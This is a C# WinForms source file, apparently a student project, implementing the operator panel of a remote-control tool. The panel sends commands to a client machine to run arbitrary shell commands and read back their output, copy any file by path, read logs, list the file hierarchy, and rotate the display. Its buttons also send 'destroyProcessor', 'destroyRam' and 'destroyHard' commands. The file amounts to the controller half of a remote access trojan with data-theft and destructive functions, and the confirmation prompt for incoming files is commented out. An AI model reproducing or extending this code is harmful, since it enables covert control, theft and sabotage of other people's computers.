using NetworkCommsDotNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server
{
    public partial class ClientForm : Form
    {
        int port = 50000;
        string clientIP;
        int clientPort;
        string serverIP;
        public ClientForm(string clientIP, int clientPort, string serverIP)
        {
            InitializeComponent();
            this.clientIP = clientIP;
            this.clientPort = clientPort;
            this.serverIP = serverIP;
        }

        private void ClientForm_Load(object sender, EventArgs e)
        {
            string name = clientIP + " : " + clientPort.ToString();
            this.Text = name;
        }

        private void sendMessageButton_Click(object sender, EventArgs e)
        {
            if (messageRichTextBox.TextLength == 0)
            {
                System.Windows.Forms.MessageBox.Show("No message to send");
            } else
            {
                Debug.Print(String.Format(".{0}.\n", clientIP));
                Debug.Print(String.Format(".{0}.\n", clientPort.ToString()));
                NetworkComms.SendObject("OSMessage", clientIP, clientPort, messageRichTextBox.Text);
            }
        }

        private void rotateDisplayButton_Click(object sender, EventArgs e)
        {
            NetworkComms.SendObject("RotateDisplay", clientIP, clientPort, "");
            
        }



        private void getHierarchyButton_Click(object sender, EventArgs e)
        {

            ReceiveTCP(port, "getHierarchy", "", "ierarhie.txt");
            //NetworkComms.SendObject("getHierarchy", clientIP, clientPort, "");
            Process.Start("notepad.exe", "ierarhie.txt");
        }

        public void HandleIncomingFile(int port)
        {
            try
            {
                Debug.WriteLine("Incep HandleIncomingFile");

                TcpListener tcpListener = new TcpListener(IPAddress.Parse(serverIP) , port);
                tcpListener.Start();
                while (true)
                {
                    Socket handlerSocket = tcpListener.AcceptSocket();
                    Debug.WriteLine("send getHierarchy");
                    NetworkComms.SendObject("getHierarchy", clientIP, clientPort, "");
                    Debug.WriteLine("sent getHierarchy");
                    if (handlerSocket.Connected)
                    {
                        Debug.WriteLine("handlerSocket.Connected");
                        string fileName = string.Empty;
                        NetworkStream networkStream = new NetworkStream(handlerSocket);
                        int thisRead = 0;
                        int blockSize = 1024;
                        Byte[] dataByte = new Byte[blockSize];
                        Debug.WriteLine("start lock");
                        lock (this)
                        {
                            string folderPath = System.Environment.SpecialFolder.MyDocuments.ToString();
                            Debug.WriteLine("folderPath = ." + folderPath + ".");
                            int receivedBytesLen = handlerSocket.Receive(dataByte);
                            int fileNameLen = BitConverter.ToInt32(dataByte, 0);
                            fileName = clientIP + clientPort.ToString();//Encoding.ASCII.GetString(dataByte, 4, fileNameLen);
                            Debug.WriteLine("open file");
                            Stream fileStream = File.OpenWrite(folderPath + fileName);
                            Debug.WriteLine("opened file");
                            fileStream.Write(dataByte, 4 + fileNameLen, (1024 - (4 + fileNameLen)));
                            while (true)
                            {
                                Debug.WriteLine("start while");
                                thisRead = networkStream.Read(dataByte, 0, blockSize);
                                Debug.WriteLine("read stream");
                                fileStream.Write(dataByte, 0, thisRead);
                                if (thisRead == 0)
                                    break;
                            }
                            fileStream.Close();
                        }
                        
                    }
                }
            }
            catch { }
        }

        const string APPEND = "1";
        const string TRUNC = "0";
        private void sendCommandButton_Click(object sender, EventArgs e)
        {
            if (commandRichTextBox.Text.Length == 0)
            {
                System.Windows.Forms.MessageBox.Show("No command to send");
            }
            else
            {
                if (commandRichTextBox.Text.Contains(">"))
                {
                    NetworkComms.SendObject("Command", clientIP, clientPort, commandRichTextBox.Text);
                }
                else
                {
                    if (appendCheckBox.Checked)
                    {
                        Debug.WriteLine("appended checked");
                        NetworkComms.SendObject("Command", clientIP, clientPort, APPEND + commandRichTextBox.Text);
                    }
                    else
                    {
                        Debug.WriteLine("appended unchecked");
                        NetworkComms.SendObject("Command", clientIP, clientPort, TRUNC + commandRichTextBox.Text);
                    }
                    //System.Threading.Sleep(1000);
                    const String OUTPUTFILE = "outputfile.txt";
                    ReceiveTCP(port, "none", OUTPUTFILE, clientIP + clientPort.ToString() + OUTPUTFILE);
                    //Process("notepad.exe", OUTPUTFILE);
                    //Process.Start("notepad.exe", clientIP + clientPort.ToString() + OUTPUTFILE);
                    outputRichTextBox.LoadFile(clientIP + clientPort.ToString() + OUTPUTFILE, RichTextBoxStreamType.PlainText);
                    

                }
                
            }
            
        }

        private void destroyProcessorButton_Click(object sender, EventArgs e)
        {
            NetworkComms.SendObject("destroyProcessor", clientIP, clientPort, TRUNC + commandRichTextBox.Text);
        }

        private void destroyRamButton_Click(object sender, EventArgs e)
        {
            NetworkComms.SendObject("destroyRam", clientIP, clientPort, TRUNC + commandRichTextBox.Text);
        }

        public void ReceiveTCP(int portN, string code, string mesaj, string SaveFileName)
        {
            int BufferSize = 1024;
            TcpListener Listener = null;
            try
            {
                Listener = new TcpListener(IPAddress.Parse(serverIP), portN);
                Listener.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            byte[] RecData = new byte[BufferSize];
            int RecBytes;

            NetworkComms.SendObject(code, clientIP, clientPort, mesaj);

            for (; ; )
            {
                TcpClient client = null;
                NetworkStream netstream = null;
                string Status = string.Empty;
                try
                {
                    string message = "Accept the Incoming File ";
                    string caption = "Incoming Connection";
                    MessageBoxButtons buttons = MessageBoxButtons.YesNo;
                    DialogResult result;

                    if (Listener.Pending())
                    {
                        client = Listener.AcceptTcpClient();
                        netstream = client.GetStream();
                        Status = "Connected to a client\n";
                        //result = MessageBox.Show(message, caption, buttons);

                        if (true)//result == System.Windows.Forms.DialogResult.Yes)
                        {
                            //string SaveFileName = "myfile.txt";
                            //SaveFileDialog DialogSave = new SaveFileDialog();
                            //DialogSave.Filter = "All files (*.*)|*.*";
                            //DialogSave.RestoreDirectory = true;
                            //DialogSave.Title = "Where do you want to save the file?";
                            //DialogSave.InitialDirectory = @"C:/";
                            //if (DialogSave.ShowDialog() == DialogResult.OK)
                            //    SaveFileName = DialogSave.FileName;
                            if (SaveFileName != string.Empty)
                            {
                                int totalrecbytes = 0;

                                Debug.WriteLine("SaveFileName e ." + SaveFileName + ".");
                                FileStream Fs = new FileStream(SaveFileName.Replace(":", ""), FileMode.Create, FileAccess.Write);
                                while ((RecBytes = netstream.Read(RecData, 0, RecData.Length)) > 0)
                                {
                                    Fs.Write(RecData, 0, RecBytes);
                                    totalrecbytes += RecBytes;
                                }
                                Fs.Close();
                            }
                            netstream.Close();
                            client.Close();
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    //netstream.Close();
                }

            }

            Listener.Stop();
        }

        private void copyFileButton_Click(object sender, EventArgs e)
        {
            if(filePathRichTextBox.Text.Length == 0)
            {
                System.Windows.Forms.MessageBox.Show("No file path inserted");
            }
            string SaveFileName = filePathRichTextBox.Text;
            if (SaveFileName.Contains("\\"))
            {
                SaveFileName = SaveFileName.Split('\\').Last();
            }
            ReceiveTCP(port, "copyFile", filePathRichTextBox.Text, clientIP + clientPort.ToString() + SaveFileName);
           
        }

        private void viewLogFilebutton_Click(object sender, EventArgs e)
        {
            ReceiveTCP(port, "viewLogFile", "log.txt", clientIP + clientPort.ToString() + "log.txt");
            Process.Start("notepad.exe", clientIP + clientPort.ToString() + "log.txt");
        }

        private void destroyHardButton_Click(object sender, EventArgs e)
        {
            NetworkComms.SendObject("destroyHard", clientIP, clientPort, TRUNC + commandRichTextBox.Text);
        }
    }
}
